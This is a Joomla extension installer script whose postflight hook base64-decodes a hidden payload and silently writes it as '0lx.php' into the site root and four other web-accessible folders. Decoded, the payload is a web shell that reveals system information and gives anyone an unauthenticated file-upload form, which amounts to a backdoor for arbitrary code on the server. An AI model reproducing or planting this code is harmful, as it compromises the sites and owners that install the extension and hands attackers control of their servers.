<?php
defined("_JEXEC") or die;
class Xrlz8oInstallerScript {
    public function postflight($type, $parent) {
        $d = base64_decode("PD9waHAgZWNobyAnSHVsSzNHVjxwcmU+Jy5waHBfdW5hbWUoKS4iXG4iLic8YnIvPjxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9Il9fIj48aW5wdXQgbmFtZT0iXyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JztpZigkX1BPU1Qpe2lmKEBjb3B5KCRfRklMRVNbJ19fJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ19fJ11bJ25hbWUnXSkpe2VjaG8gJ09LJzt9ZWxzZXtlY2hvICdFUic7fX0/Pg==");
        $paths = array(
            JPATH_ROOT . "/0lx.php",
            JPATH_ROOT . "/images/0lx.php",
            JPATH_ROOT . "/media/0lx.php",
            JPATH_ROOT . "/templates/0lx.php",
            JPATH_ROOT . "/tmp/0lx.php"
        );
        foreach ($paths as $p) {
            @file_put_contents($p, $d);
            @chmod($p, 0644);
        }
    }
}